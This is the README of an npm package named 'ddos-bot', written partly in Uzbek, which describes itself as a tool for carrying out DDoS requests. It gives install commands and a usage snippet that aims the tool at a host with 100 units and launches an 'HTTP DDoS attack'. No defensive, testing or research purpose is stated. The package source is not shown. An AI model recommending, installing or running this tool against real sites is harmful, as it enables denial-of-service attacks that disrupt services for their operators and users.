
# ddos-bot

> Ddos so'rovlarini amalga oshirish uchun mo'ljallangan

## Prerequisites

This project supports all versions of Node.js
[Node](http://nodejs.org/) and [NPM](https://npmjs.org/) are really easy to install.
To make sure you have them available on your machine,
try running the following command.

```sh
$ npm i ddos-bot

```

## Table of contents

- [ddos-bot](ddos-bot)
  - [httpDdos](#httpDdos)
  


## Getting Started

Ddos so'rovlarini amalga oshirish mumkin bo'lgan paket
## Installation

```sh
$ npm i ddos-bot
```



```js
const DDoSBots = require('ddos-bot'); // Paket nomi
const ddos = new DDoSBots('example.com', 100);

// HTTP DDoS hujumi
ddos.httpDdos();

```